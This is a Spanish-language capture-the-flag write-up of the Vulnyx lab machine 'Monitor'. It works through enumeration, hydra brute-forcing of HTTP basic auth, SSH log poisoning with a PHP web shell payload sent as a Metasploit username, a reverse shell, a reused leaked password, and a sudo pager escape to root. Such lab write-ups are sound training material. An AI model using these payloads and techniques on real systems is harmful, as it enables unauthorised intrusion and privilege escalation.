+++
author = "Andrés Del Cerro"
title = "Vulnyx: Monitor Writeup | Hard"
date = "2024-11-22"
description = ""
tags = [
    "Vulnyx",
    "Monitor",
    "Writeup",
    "Cybersecurity",
    "Penetration Testing",
    "CTF",
    "Reverse Shell",
    "Privilege Escalation",
    "RCE",
    "Exploit",
    "Linux",
    "HTTP Enumeration",
    "VHost Fuzzing",
    "HTTP-GET Bruteforcing",
    "hydra",
    "Exposed SSH Logs",
    "IPv6 TCP Enumeration",
    "Log Poisoning",
    "User Pivoting",
    "Exposed User Credentials",
    "Information Disclosure",
    "Abusing Password Reuse",
    "Abusing sudo privilege",
    "Abusing lfm binary"
]

+++

# Vulnyx: Monitor Writeup

Welcome to my detailed writeup of the hard difficulty machine **"Monitor"** on Vulnyx. This writeup will cover the steps taken to achieve initial foothold and escalation to root.

# TCP Enumeration

```console
rustscan -a $VICTIM --ulimit 5000 -g
192.168.18.131 -> [80]
```

```console
nmap -p80 -sCV $VICTIM  -oN allPorts
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-22 11:10 CET
Nmap scan report for 192.168.18.131
Host is up (0.00029s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Apache2 Debian Default Page: It works

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.63 seconds
```

# UDP Enumeration

```console
sudo nmap --top-ports 1500 -sU --min-rate 5000 -n -Pn $VICTIM -oN allPorts.UDP
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-22 11:10 CET
Nmap scan report for 192.168.18.131
Host is up (0.00021s latency).
Not shown: 1494 open|filtered udp ports (no-response)
PORT      STATE  SERVICE
407/udp   closed timbuktu
639/udp   closed msdp
6050/udp  closed x11
21902/udp closed unknown
28349/udp closed unknown
29319/udp closed unknown
MAC Address: 00:0C:29:30:13:A0 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 0.88 seconds
```

Del escaneo inicial podemos suponer que la intrusión de esta máquina va a ser vía web, ya que solo encontramos el puerto 80/TCP abierto.

# HTTP Enumeration

`whatweb` nos reporta que como servidor web se está utilizando `Apache2` y además nos reporta un dominio `monitoring.nyx`, vamos a añadirlo al `/etc/hosts`.
```console
whatweb http://$VICTIM:80
http://192.168.18.131:80 [200 OK] Apache[2.4.56], Country[RESERVED][ZZ], Email[contact@monitoring.nyx], HTTPServer[Debian Linux][Apache/2.4.56 (Debian)], IP[192.168.18.131], Title[Apache2 Debian Default Page: It works]
```

El sitio web es la página por defecto al instalar Apache2 (nos lleva al mismo lugar si accedemos por dominio, es decir, no se está aplicando Virtual Hosting)
![Write-up Image](images/Screenshot_1.png)

No nos queda otra que fuzzear en búsqueda de recursos interesantes.

Al fuzzear con `feroxbuster` no encontramos nada interesante.

```console
feroxbuster -u http://$VICTIM -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -d 1 -t 100

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.18.131
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 1
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       24l      126w    10355c http://192.168.18.131/icons/openlogo-75.png
200      GET      369l      936w    10775c http://192.168.18.131/
[####################] - 21s   220552/220552  0s      found:2       errors:0
[####################] - 20s   220547/220547  10792/s http://192.168.18.131/                      
```


Fuzzeando con extensiones de archivos tampoco encontré nada.
```console
feroxbuster -u http://$VICTIM -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -d 1 -t 100 -x php,txt,tar,gz,html,bk

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.18.131
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, tar, gz, html, bk]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 1
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      279c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      276c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET      369l      936w    10775c http://192.168.18.131/index.html
200      GET       24l      126w    10355c http://192.168.18.131/icons/openlogo-75.png
200      GET      369l      936w    10775c http://192.168.18.131/
[######>-------------] - 46s   509438/1543864 2m      found:3       errors:0
[####################] - 2m   1543864/1543864 0s      found:3       errors:0
[####################] - 2m   1543829/1543829 10889/s http://192.168.18.131/ 
```

## VHost Fuzzing
Encontramos un subdominio `event` al fuzzear con `wfuzz`, esto podría ser interesante pero vemos que el tipo de respuesta es un 403, es decir, Forbidden.
```console
wfuzz --hh=10775 -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.monitoring.nyx" http://monitoring.nyx
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://monitoring.nyx/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000380:   403        9 L      28 W       285 Ch      "event"
```

Agregamos el dominio `event.monitoring.nyx` al `/etc/hosts`

Obviamente no podemos ver nada.
![Write-up Image](images/Screenshot_2.png)

Fuzzeando este subdominio con `feroxbuster` tampoco encontré nada, ni con extensiones ni sin ellas.
```console
feroxbuster -u http://event.monitoring.nyx -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -d 1 -t 100 -x php,txt,tar,gz,html,bk

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://event.monitoring.nyx
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, tar, gz, html, bk]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 1
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      285c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        9l       31w      282c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
[####################] - 3m   1543829/1543829 0s      found:0       errors:0
[####################] - 3m   1543829/1543829 10033/s http://event.monitoring.nyx/
```

Así que en este punto, podemos probar a fuzzear con otras listas en vez de con la que siempre uso `directory-list-2.3-medium.txt`.

## Discovering interesting hidden resource
Después de varios fuzzeos y bastantes listas probadas, encontré un recurso `/.admin` en la lista de `raft-large-extensions-lowercase.txt`
```console
feroxbuster -u http://event.monitoring.nyx -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-extensions-lowercase.txt -d 1 -t 100

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://event.monitoring.nyx
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-extensions-lowercase.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 1
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      282c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      285c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
401      GET       14l       54w      467c http://event.monitoring.nyx/.admin
[####################] - 3s      2368/2368    0s      found:1       errors:0
[####################] - 3s      2368/2368    922/s   http://event.monitoring.nyx/
```

Este sitio nos pide autenticación, y por ahora no tenemos ninguna credencial.
![Write-up Image](images/Screenshot_3.png)

## HTTP-GET Bruteforcing
Podemos probar con `hydra` a realizar fuerza bruta, recomiendo dejarlo poco tiempo ya que esto es muy ruidoso y en una máquina, por muy difícil que sea, no creo que os hagan recorrer el `rockyou.txt` hasta el final haciendo fuerza bruta por HTTP que ya sabemos que tarda bastante mas que simplemente utilizando `john` o `hashcat`.

El realm también nos da una pista de cual podría ser el usuario...
![Write-up Image](images/Screenshot_5.png)

```console
hydra -l admin -P /usr/share/wordlists/rockyou.txt -t 10 -f event.monitoring.nyx http-get "/.admin" -V -I
```

Después de un ratito, encontramos unas credenciales que aparentemente son válidas.
![Write-up Image](images/Screenshot_6.png)

Tiene pinta de que las credenciales son válidas, pero no tenemos capacidad de directory listing en el recurso `.admin`, así que vamos a seguir fuzzeando con extensiones a ver si encontramos algún archivo interesante.
![Write-up Image](images/Screenshot_7.png)

## Finding interesting file
Encontramos un recurso interesante,  `/.admin/event.php`
```console
feroxbuster -u 'http://admin:system@event.monitoring.nyx/.admin/' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -d 1 -t 100 -x php,txt,tar,gz,html,bk

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.3
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://admin:system@event.monitoring.nyx/.admin/
 🚀  Threads               │ 100
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.3
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, txt, tar, gz, html, bk]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 1
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      282c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      285c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET       11l       14w      133c http://event.monitoring.nyx/.admin/event.php
```

Bien, ¿y ahora qué?
![Write-up Image](images/Screenshot_8.png)

# IPv6 TCP Enumeration
Después de un rato, decidí calcular la IPv6 de la máquina víctima.

Una forma de hacer esto es derivarla desde su dirección MAC, por lo cual podemos comprobar nuestra tabla ARP para conseguir la MAC de la máquina víctima.
```console
arp -a
? (192.168.18.254) at 00:50:56:e0:53:3a [ether] on eth0
event.monitoring.nyx (192.168.18.131) at 00:0c:29:30:13:a0 [ether] on eth0
? (192.168.18.2) at 00:50:56:e2:01:31 [ether] on eth0
```

Y en vez de hacer el cálculo manual, podemos utilizar [esta herramienta online](https://nettools.club/mac2ipv6) (que también nos dice como hacer el cálculo manualmente si queremos) para conseguir la IPv6.
![Write-up Image](images/Screenshot_9.png)

Ahora, podemos utilizar `nmap` con el parámetro `-6` para hacer un escaneo por IPv6 y vemos un puerto interesante expuesto por IPv6 que no estaba por IPv4, el SSH.
```console
sudo nmap -p- --min-rate 5000 -n -Pn -sS -6 'fe80::20c:29ff:fe30:13a0'
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-22 11:50 CET
Nmap scan report for fe80::20c:29ff:fe30:13a0
Host is up (0.00070s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:30:13:A0 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 2.42 seconds
```

Para intentar conectarnos por SSH podemos utilizar el mismo comando `ssh` pero con este formato.
```text
ssh -6 [login_other_comp]@fe80....%[interface_lan_name]
```

Y vemos que podemos intentar conectarnos, pero no tenemos la clave privada, además, como método de autenticación, aparentemente solo se admite la autenticación por clave privada.
```console
ssh -6 test@fe80::20c:29ff:fe30:13a0%eth0
The authenticity of host 'fe80::20c:29ff:fe30:13a0%eth0 (fe80::20c:29ff:fe30:13a0%eth0)' can't be established.
ED25519 key fingerprint is SHA256:3dqq7f/jDEeGxYQnF2zHbpzEtjjY49/5PvV5/4MMqns.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'fe80::20c:29ff:fe30:13a0%eth0' (ED25519) to the list of known hosts.
test@fe80::20c:29ff:fe30:13a0%eth0: Permission denied (publickey).
```

# Log Poisoning 2 RCE -> Foothold
Sin embargo, en el monitor de eventos que hemos encontrado antes, podemos ver que vemos el log de SSH... Por lo cual esto podríamos escalarlo a ejecución remota de comandos a través del típico `Log Poisoning` ya que el archivo que está cargando estos logs tiene la extensión `.php`
![Write-up Image](images/Screenshot_10.png)

Esto no lo podemos hacer mediante el comando `ssh` ya que hace tiempo se añadió un filtro de caracteres especiales, este filtro solo existe en el cliente por lo cual si al servidor le llega una solicitud con un nombre de usuario que contenga caracteres especiales la va a procesar igualmente.

Para hacer esto, podemos hacer uso de [este módulo de metasploit](https://www.offsec.com/metasploit-unleashed/scanner-ssh-auxiliary-modules/) y así saltarnos este filtro de caracteres.

```console
msf6 > use auxiliary/scanner/ssh/ssh_login
msf6 auxiliary(scanner/ssh/ssh_login) > set USERNAME <?php system($_GET["cmd"]); ?>
USERNAME => <?php system($_GET[cmd]); ?>
msf6 auxiliary(scanner/ssh/ssh_login) > set PASSWORD loquesea
PASSWORD => loquesea
msf6 auxiliary(scanner/ssh/ssh_login) > set RHOSTS fe80::20c:29ff:fe83:8fd5%eth0
RHOSTS => fe80::20c:29ff:fe83:8fd5%eth0
msf6 auxiliary(scanner/ssh/ssh_login) > show options

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting                Required  Description
   ----              ---------------                --------  -----------
   ANONYMOUS_LOGIN   false                          yes       Attempt to login with a blank username and password
   BLANK_PASSWORDS   false                          no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                              yes       How fast to bruteforce, from 0 to 5
   CreateSession     true                           no        Create a new session for every successful login
   DB_ALL_CREDS      false                          no        Try each user/password couple stored in the current
                                                               database
   DB_ALL_PASS       false                          no        Add all passwords in the current database to the li
                                                              st
   DB_ALL_USERS      false                          no        Add all users in the current database to the list
   DB_SKIP_EXISTING  none                           no        Skip existing credentials stored in the current dat
                                                              abase (Accepted: none, user, user&realm)
   PASSWORD          loquesea                       no        A specific password to authenticate with
   PASS_FILE                                        no        File containing passwords, one per line
   RHOSTS            fe80::20c:29ff:fe83:8fd5%eth0  yes       The target host(s), see https://docs.metasploit.com
                                                              /docs/using-metasploit/basics/using-metasploit.html
   RPORT             22                             yes       The target port
   STOP_ON_SUCCESS   false                          yes       Stop guessing when a credential works for a host
   THREADS           1                              yes       The number of concurrent threads (max one per host)
   USERNAME          <?php system($_GET[cmd]); ?>   no        A specific username to authenticate as
   USERPASS_FILE                                    no        File containing users and passwords separated by sp
                                                              ace, one pair per line
   USER_AS_PASS      false                          no        Try the username as the password for all users
   USER_FILE                                        no        File containing usernames, one per line
   VERBOSE           false                          yes       Whether to print output for all attempts


View the full module info with the info, or info -d command.

msf6 auxiliary(scanner/ssh/ssh_login) > run

[*] fe80::20c:29ff:fe83:8fd5%eth0:22 - Starting bruteforce
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Ahora, podemos ver que somos capaces de ejecutar comandos en la máquina víctima a través del query parameter `cmd`
![Write-up Image](images/Screenshot_11.png)

Ahora, nos podemos poner en escucha con `pwncat-cs` por el puerto 443.

```console
pwncat-cs -lp 443
```

Y enviarnos una revshell con el típico one-liner de bash.
![Write-up Image](images/Screenshot_12.png)

Y de esta forma ya hemos ganado acceso a la máquina víctima.
```console
(remote) www-data@monitor:/var/www/site/.admin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# User Pivoting
## Exposed User Credential + Abusing Password Reuse
Como no tenemos acceso a la flag y detectamos que existe un usuario a parte de `root` llamado `kevin`, supongo que tenemos que migrar a este usuario primero para poder escalar privilegios.
```console
(remote) www-data@monitor:/var/www/site/.admin$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
kevin:x:1000:1000:kevin:/home/kevin:/bin/bash
```

Haciendo un análisis con `linpeas.sh` encontré lo siguiente.
![Write-up Image](images/Screenshot_13.png)

Obviamente corresponde al hash de la contraseña que hemos hecho fuerza bruta antes, pero siempre es buena idea revisar este archivo por si hay algún otro hash o credencial comentada como es el caso...
```console
(remote) www-data@monitor:/tmp$ cat /etc/apache2/.htpasswd
admin:$apr1$3Duw.Wk/$tTB.rbcdqZvDC53SFe8Ab/
#kevin:$up3r_$3cUr3_@p@CHe
```

Y de esta forma podemos migrar al usuario `kevin` ya que también reutiliza la contraseña y podemos leer la flag de `kevin`
```console
(remote) www-data@monitor:/tmp$ su kevin
Password:
kevin@monitor:/tmp$ ls -la /home/kevin/
total 24
drwx------ 2 kevin kevin 4096 abr 23  2023 .
drwxr-xr-x 3 root  root  4096 nov  3  2023 ..
lrwxrwxrwx 1 root  root     9 abr 23  2023 .bash_history -> /dev/null
-rw------- 1 kevin kevin  220 ene 15  2023 .bash_logout
-rw------- 1 kevin kevin 3526 ene 15  2023 .bashrc
-rw------- 1 kevin kevin  807 ene 15  2023 .profile
-r-------- 1 kevin kevin   33 nov  3  2023 user.txt
kevin@monitor:/tmp$ cat /home/kevin/user.txt
9951f9dd45d885d...
```
# Privilege Escalation
Podemos ver que `kevin` tiene permiso para ejecutar como `root` el binario `lfm`
```console
kevin@monitor:/tmp$ sudo -l
Matching Defaults entries for kevin on monitor:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User kevin may run the following commands on monitor:
    (root) NOPASSWD: /usr/bin/lfm
```

Al ejecutarlo me di cuenta que era un editor de texto, y con bastantes funcionalidades, por lo que me imaginé que como con `nano` o con `vi`, podemos llegar a ejecutar comandos.
![Write-up Image](images/Screenshot_14.png)

Hay una funcionalidad de poder abrir una shell.
![Write-up Image](images/Screenshot_15.png)

Pero simplemente, cuando abrí un archivo (en este caso `linpeas.sh` que es bastante grande) vi que se utilizaba el pager por defecto que suele ser `less`

Y con este pager, si introducimos el carácter `!COMANDO` podemos ejecutar un comando, y como estamos ejecutando `lfm` como `root`, este comando lo ejecutaremos como `root`
![Write-up Image](images/Screenshot_16.png)

Y conseguimos una consola como `root`
```console
root@monitor:/tmp# id
uid=0(root) gid=0(root) grupos=0(root)
```

Podemos leer la flag de `root`
```console
root@monitor:~# cat root.txt
2b56bbc9dffd52...
```

¡Y ya estaría!

Happy Hacking! 🚀